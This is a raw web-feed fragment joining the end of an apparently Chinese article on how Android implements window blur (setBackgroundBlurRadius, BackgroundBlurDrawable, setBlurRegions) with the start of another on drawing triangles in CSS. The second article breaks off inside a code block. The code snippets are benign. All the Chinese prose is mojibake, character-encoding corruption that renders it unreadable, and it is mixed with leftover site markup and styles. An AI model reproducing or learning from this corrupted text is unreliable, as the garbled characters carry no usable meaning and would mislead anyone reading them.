<p>blurBehindRadiuså‚æ•°ä¼šä¼ é€’åˆ°system_serverç«¯ WindowStateä¸­ï¼Œç”±Dimmerè®¾ç½®ï¼ˆæ–°å»ºäº†ä¸€ä¸ªdimLayerï¼‰ï¼Œæœ€ç»ˆæ˜¯è°ƒç”¨</p>
<p><strong>setBackgroundBlurRadius</strong> æ¥å£</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/38885f22a2d54b76a42a23241b511889~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg6KiARWNobw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767625233&amp;x-signature=uLrsUHizsIk8Bt0Eb2UBsObj7Hg%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b95e49a5ac564dc6b54d97a5e18d7a3e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg6KiARWNobw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767625233&amp;x-signature=cqN%2FCuUoRJUwIwbuEaz1OYFO8Rg%3D" alt="" loading="lazy"/></p>
<ol start="2">
<li>
<h2 data-id="heading-1">background blur</h2>
</li>
</ol>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"BackgroundBlur"</span> <span class="hljs-attr">parent</span>=<span class="hljs-string">"Theme.CarLauncher"</span>&gt;</span><span class="xml">
    <span class="hljs-tag">&lt;<span class="hljs-name">item</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"android:windowIsTranslucent"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">item</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">item</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"android:windowBackgroundBlurRadius"</span>&gt;</span>70dp<span class="hljs-tag">&lt;/<span class="hljs-name">item</span>&gt;</span>
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// ä»£ç æ–¹å¼è®¾ç½®</span>
 window.setBackgroundBlurRadius(<span class="hljs-number">70</span>)
</code></pre>
<p>setBackgroundBlurRadiusæ—¶åšäº†ä»€ä¹ˆäº‹ï¼Ÿ</p>
<p>ä»…ä»…æ˜¯åˆ›å»ºäº†ä¸€ä¸ªBackgroundBlurDrawableå¹¶è®¾ç½®åˆ°DecorViewçš„èƒŒæ™¯ä¸­</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8c8242d0de5e489db4346902c98ed75a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg6KiARWNobw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767625233&amp;x-signature=4%2B1NzU9SSwFTHsgzHNEOP45IBco%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a97ccb75c7ef46dd89dbb14bc2225ea8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg6KiARWNobw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767625233&amp;x-signature=1NekvljeOUmbhgjztBwOD%2FNaWdI%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6cd202f6f58b4148b27d3ac93a85cf6e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg6KiARWNobw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767625233&amp;x-signature=AxP3Kc51hRe0RG9AwsTbSjH69Pg%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/86f78b3f3b894131810b21552959ec7a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg6KiARWNobw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767625233&amp;x-signature=GdgexbvN8CQLO97hFyZPZ2TwicQ%3D" alt="" loading="lazy"/></p>
<ol>
<li>
<h3 data-id="heading-2">BackgroundBlurDrawable</h3>
</li>
</ol>
<p>BackgroundBlurDrawableåˆ°åº•åšäº†ä»€ä¹ˆç¥å¥‡çš„äº‹æƒ…å®ç°äº†èƒŒæ™¯é«˜æ–¯æ¨¡ç³Šï¼Ÿ</p>
<p>BackgroundBlurDrawableä»£ç åªæœ‰çŸ­çŸ­å‡ ç™¾è¡Œï¼Œç›¸å¯¹æ¯”è¾ƒç®€å•ï¼Œ</p>
<p>æ ¸å¿ƒåªæ˜¯ï¼š<strong>è®°å½•ä¸‹æ¨¡ç³Šå‚æ•°ï¼šåæ ‡èŒƒå›´ï¼Œåœ†è§’å€¼ï¼Œæ¨¡ç³ŠåŠå¾„ï¼Œé€æ˜åº¦ã€‚</strong></p>
<p>åœ†è§’å€¼ï¼Œæ¨¡ç³ŠåŠå¾„ï¼Œé€æ˜åº¦éƒ½å¯ä»¥é€šè¿‡BackgroundBlurDrawableå…¬å¼€æ¥å£è®¾ç½®ï¼Œä¸å¤šè§£é‡Šã€‚</p>
<p><strong>åæ ‡èŒƒå›´æ˜¯é€šè¿‡ç›‘å¬RenderNodeä½ç½®å˜åŒ–è·å¾—</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b0da7f003c3a406eaad9037105573848~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg6KiARWNobw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767625233&amp;x-signature=pBdup%2B7pfF159jkxLeTHKG58PJY%3D" alt="" loading="lazy"/></p>
<p>Aggregatorå¯ä»¥ä¿å­˜å¤šä¸ªBackgroundBlurDrawableï¼Œä¹Ÿå°±æ˜¯è¯´ï¼š</p>
<p><strong>ä¸€ä¸ªçª—å£ä¸Šæ˜¯å¯ä»¥ä½¿ç”¨å¤šä¸ªBackgroundBlurDrawable</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/62bef324ee9743a68df904db7d803c19~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg6KiARWNobw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767625233&amp;x-signature=1RmI5BVbtsDjjihoGSPWU4bEuuU%3D" alt="" loading="lazy"/></p>
<p>ä¸€ä¸ªViewRootImplå¯¹åº”ä¸€ä¸ªAggregatorï¼ŒAggregatorå¯¹åº”å¤šä¸ªBackgroundBlurDrawable</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f3bca6321862415da846b47a477bf860~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg6KiARWNobw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767625233&amp;x-signature=BD1Fk4LkDWGvXLyv%2BGCUrjONt0k%3D" alt="image.png" loading="lazy"/></p>
<ol start="2">
<li>
<h3 data-id="heading-3">Aggregatorå¦‚ä½•è¿é€šViewRootImplå’ŒBackgroundBlurDrawable</h3>
</li>
</ol>
<p>æ¯ä¸€æ¬¡åˆ·æ–°ç•Œé¢æ—¶ï¼Œå¦‚æœAggregator<strong>æ¨¡ç³ŠåŒºåŸŸå‘ç”Ÿæ›´æ–°</strong>æˆ–è€…<strong>å­˜åœ¨æ¨¡ç³ŠåŒºåŸŸ</strong>ï¼Œ</p>
<p>ä¼šè¯»å–å½“å‰çš„æ¨¡ç³ŠåŒºåŸŸå‚æ•°ï¼Œå‘é€ç»™SurfaceFlingerç«¯</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f55a3d271c75425496e46dc8ab9cf3d1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg6KiARWNobw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767625233&amp;x-signature=o5BxBcijtKudKNKNT5Jg3MlTXtU%3D" alt="" loading="lazy"/></p>
<p>æ¯ä¸ªBackgroundBlurDrawableéƒ½å¯ä»¥è½¬æ¢æˆä¸€ä¸ªBlurRegionæ•°æ®ç»“æ„ï¼Œ</p>
<p>æ‰€ä»¥å¤šä¸ªDrawableå°±è½¬æ¢æˆäº†ä¸€ä¸ªBlurRegionæ•°ç»„</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/506fc8256c064e4eb9fa7be8ba63754e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg6KiARWNobw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767625233&amp;x-signature=yqKkHCchXLPbrQdUNz3VCTSqFCk%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a0c4f247097c460692b603989bf0267d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg6KiARWNobw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767625233&amp;x-signature=2ltsNLFJhGJdoCZBRnFuszCNkv0%3D" alt="" loading="lazy"/></p>
<p>ä¸€ä¸ªBlurRegionå¯ä»¥è½¬æ¢ä¸ºä¸€ä¸ªfloatæ•°ç»„ï¼Œé‚£ä¹ˆå¤šä¸ªBlurRegionå¯è½¬æ¢ä¸ºä¸€ä¸ªfloatäºŒç»´æ•°ç»„</p>
<p>å³ å¤šä¸ªBackgroundBlurDrawableè®°å½•çš„æ¨¡ç³Šå‚æ•°ï¼Œ<strong>æœ€ç»ˆè½¬æ¢æˆäº†floatäºŒç»´æ•°ç»„</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b413e97abc6d4db889d9117da757efc4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg6KiARWNobw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767625233&amp;x-signature=TMWucEUgBWLsNGxvo3oKuOnl7DE%3D" alt="" loading="lazy"/></p>
<p>ç„¶åå°†è¡¨ç¤ºæ¨¡ç³Šå‚æ•°çš„floatäºŒç»´æ•°ç»„é€šè¿‡<strong>setBlurRegions</strong>ä¸‹è®¾</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/243b3673c5a6431eb4e74a50bc233b59~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg6KiARWNobw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767625233&amp;x-signature=VJXDf5UaoHQNNFDhzDa2U%2FI2Woo%3D" alt="" loading="lazy"/></p>
<p>æœ‰ä¸€ä¸ªç»†èŠ‚æ˜¯ï¼šç›‘å¬æ¨¡ç³Šåæ ‡èŒƒå›´mRectæ›´æ–°å¹¶æ²¡æœ‰ç«‹å³æ‰§è¡Œï¼Œè€Œæ˜¯ä½œä¸ºRunableå’Œå¸§æ•°ä¸€èµ·è®°ä¸‹ï¼Œåœ¨getBlurRegionsToDispatchToSfæ—¶å†çœŸæ­£æ‰§è¡Œï¼Œè¿™æ ·é¿å…äº†å¤šçº¿ç¨‹åŒæ­¥é—®é¢˜ã€‚</p>
<blockquote>
<p>å¦‚æœmRectç«‹å³æ›´æ–°ï¼Œè¯¥æ“ä½œåœ¨çº¿ç¨‹æ± ä¸­æ‰§è¡Œï¼Œæ— æ³•ä¿è¯æ‰§è¡Œé¡ºåºã€‚å‡å¦‚ç›‘å¬åˆ°ç¬¬100å¸§çš„RenderNoderä½ç½®å˜åŒ–mRectç«‹å³æ›´æ–°äº†ï¼Œä½†æ˜¯renderThreadæ­¤æ—¶æ­£åœ¨è¯·æ±‚æ¸²æŸ“ç¬¬99å¸§ï¼Œå´ä½¿ç”¨äº†ç¬¬100å¸§çš„ä½ç½®ï¼Œå°±ä¼šå‡ºç°ä½ç½®é”™ä½çš„é—®é¢˜ã€‚</p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3f553cd0d0af46f193898123ce1c733d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg6KiARWNobw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767625233&amp;x-signature=8PZ%2FF9PLnWidqX3YpLavBI5DzpA%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c71c90ac25d74c9390a56e8bf5a17b78~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg6KiARWNobw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767625233&amp;x-signature=BZ11JcLVgexRpfCMkHFyWUSQi5A%3D" alt="" loading="lazy"/></p>
<ol start="3">
<li>
<h2 data-id="heading-4">æ€»ç»“</h2>
</li>
</ol>
<p>ç»¼ä¸Šï¼Œblur behind æœ¬è´¨ä¸Šæ˜¯ä½¿ç”¨äº†<strong>setBackgroundBlurRadius</strong> <strong>ï¼Œ</strong> background bluræœ¬è´¨ä¸Šæ˜¯ä½¿ç”¨äº†<strong>setBlurRegions</strong>ã€‚</p>
<p>é‚£ä¹ˆåˆ©ç”¨ä¸Šé¢çš„æ¥å£ï¼Œå°±å¯ä»¥å®ç°surfaceçš„å®æ—¶æ¨¡ç³Šæ˜¾ç¤ºã€‚</p>
<p>æ¯”å¦‚ï¼šåœ¨ä¸€ä¸ªsurfaceViewä¸­æ˜¾ç¤ºè§†é¢‘æˆ–è€…3Dç”»é¢ï¼Œä¸Šé¢çš„surfaceä½¿ç”¨ä¸Šé¢çš„æ¥å£å°±å¯ä»¥å®ç°æ¨¡ç³Šæ•ˆæœã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¦‚ä½•å®ç°ä¸€ä¸ªä¸‰è§’å½¢]]></title>    <link>https://juejin.cn/post/7589126814829805620</link>    <guid>https://juejin.cn/post/7589126814829805620</guid>    <pubDate>2025-12-29T15:29:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589126814829805620" data-draft-id="7589156297787310115" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¦‚ä½•å®ç°ä¸€ä¸ªä¸‰è§’å½¢"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-29T15:29:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä»£ç çŒäºº"/> <meta itemprop="url" content="https://juejin.cn/user/624972624037374"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¦‚ä½•å®ç°ä¸€ä¸ªä¸‰è§’å½¢
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/624972624037374/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä»£ç çŒäºº
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T15:29:48.000Z" title="Mon Dec 29 2025 15:29:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å®ç°ä¸‰è§’å½¢çš„å‡ ç§æ–¹æ³•</h2>
<p>åœ¨ CSS ä¸­ï¼Œå®ç°ä¸‰è§’å½¢ä¸»è¦åˆ©ç”¨Â <strong>è¾¹æ¡†ï¼ˆborderï¼‰</strong> Â çš„ç‰¹æ€§ã€‚ä»¥ä¸‹æ˜¯å„ç§å®ç°æ–¹æ³•ï¼š</p>
<h2 data-id="heading-1">æ–¹æ³•ä¸€ï¼šä½¿ç”¨ Border è¾¹æ¡†ï¼ˆæœ€å¸¸ç”¨ï¼‰</h2>
<p>è¿™æ˜¯æœ€ç»å…¸çš„æ–¹æ³•ï¼Œé€šè¿‡å°†å…ƒç´ å®½é«˜è®¾ä¸º 0ï¼Œç„¶åè®¾ç½®è¾¹æ¡†æ¥å®ç°ã€‚</p>
<h3 data-id="heading-2">1. åŸºæœ¬ä¸‰è§’å½¢</h3>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.triangle</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">border-style</span>: solid;
}
</code></pre>
<h3 data-id="heading-3">2. ä¸åŒæ–¹å‘çš„ä¸‰è§’å½¢</h3>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* å‘ä¸Šä¸‰è§’å½¢ */</span>
<span class="hljs-selector-class">.triangle-up</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">border-left</span>: <span class="hljs-number">50px</span> solid transparent;
  <span class="hljs-attribute">border-right</span>: <span class="hljs-number">50px</span> solid transparent;
  <span class="hljs-attribute">border-bottom</span>: <span class="hljs-number">100px</span> solid <span class="hljs-number">#3498db</span>;
}

<span class="hljs-comment">/* å‘ä¸‹ä¸‰è§’å½¢ */</span>
<span class="hljs-selector-class">.triangle-down</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">border-left</span>: <span class="hljs-number">50px</span> solid transparent;
  <span class="hljs-attribute">border-right</span>: <span class="hljs-number">50px</span> solid transparent;
  <span class="hljs-attribute">border-top</span>: <span class="hljs-number">100px</span> solid <span class="hljs-number">#e74c3c</span>;
}

<span class="hljs-comment">/* å‘å·¦ä¸‰è§’å½¢ */</span>
<span class="hljs-selector-class">.triangle-left</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">border-top</span>: <span class="hljs-number">50px</span> solid transparent;
  <span class="hljs-attribute">border-bottom</span>: <span class="hljs-number">50px</span> solid transparent;
  <span class="hljs-attribute">border-right</span>: <span class="hljs-number">100px</span> solid <span class="hljs-number">#2ecc71</span>;
}

<span class="hljs-comment">/* å‘å³ä¸‰è§’å½¢ */</span>
<span class="hljs-selector-class">.triangle-right</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">border-top</span>: <span class="hljs-number">50px</span> solid transparent;
  <span class="hljs-attribute">border-bottom</span>: <span class="hljs-number">50px</span> solid transparent;
  <span class="hljs-attribute">border-left</span>: <span class="hljs-number">100px</span> solid <span class="hljs-number">#f39c12</span>;
}
</code></pre>
<h3 data-id="heading-4">3. ç›´è§’ä¸‰è§’å½¢</h3>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* å·¦ä¸Šè§’ç›´è§’ä¸‰è§’å½¢ */</span>
<span class="hljs-selector-class">.triangle-top-left</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">border-top</span>: <span class="hljs-number">100px</span> solid <span class="hljs-number">#3498db</span>;
  <span class="hljs-attribute">border-right</span>: <span class="hljs-number">100px</span> solid transparent;
}

<span class="hljs-comment">/* å³ä¸‹è§’ç›´è§’ä¸‰è§’å½¢ */</span>
<span class="hljs-selector-class">.triangle-bottom-right</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">border-bottom</span>: <span class="hljs-number">100px</span> solid <span class="hljs-number">#e74c3c</span>;
  <span class="hljs-attribute">border-left</span>: <span class="hljs-number">100px</span> solid transparent;
}
</code></pre>
<h2 data-id="heading-5">æ–¹æ³•äºŒï¼šä½¿ç”¨ transform: rotate() + overflow</h2>
<p>åˆ›å»ºä¸€ä¸ªæ­£æ–¹å½¢ï¼Œç„¶åæ—‹è½¬ 45 åº¦ï¼Œå†é€šè¿‡çˆ¶å®¹å™¨è£å‰ªã€‚</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"triangle-container"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"triangle-rotate"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.triangle-container</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">100px</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;
  <span class="hljs-attribute">overflow</span>: hidden;
}

<span class="hljs-selector-class">.triangle-rotate</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">141px</span>; <span class="hljs-comment">/* âˆš2 * 100px */</span>
  <span class="hljs-attribute">height</span>: <span class="hljs-number">141px</span>;
  <span class="hljs-attribute">background</span>: <span class="hljs-number">#3498db</span>;
  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(<span class="hljs-number">45deg</span>);
  <span class="hljs-attribute">transform-origin</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span>;
  <span class="hljs-attribute">margin-top</span>: -<span class="hljs-number">71px</span>; <span class="hljs-comment">/* è°ƒæ•´ä½ç½® */</span>
  <span class="hljs-attribute">margin-left</span>: -<span class="hljs-number">71px</span>;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<h2 data-id="heading-6">æ–¹æ³•ä¸‰ï¼šä½¿ç”¨ clip-pathï¼ˆç°ä»£æ–¹æ³•ï¼‰</h2>
<p>ä½¿ç”¨ CSSÂ <code>clip-path</code>Â å±æ€§å¯ä»¥ç›´æ¥è£å‰ªå‡ºä¸‰è§’å½¢ï¼Œæ›´ç®€æ´ç›´è§‚ã€‚</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.triangle-clip</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">100px</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;
  <span class="hljs-attribute">background</span>: <span class="hljs-number">#3498db</span>;
  
  <span class="hljs-comment">/* å‘ä¸Šä¸‰è§’å½¢ */</span>
  <span class="hljs-attribute">clip-path</span>: <span class="hljs-built_in">polygon</span>(<span class="hljs-number">50%</span> <span class="hljs-number">0%</span>, <span class="hljs-number">0%</span> <span class="hljs-number">100%</span>, <span class="hljs-number">100%</span> <span class="hljs-number">100%</span>);
  
  <span class="hljs-comment">/* å‘ä¸‹ä¸‰è§’å½¢ */</span>
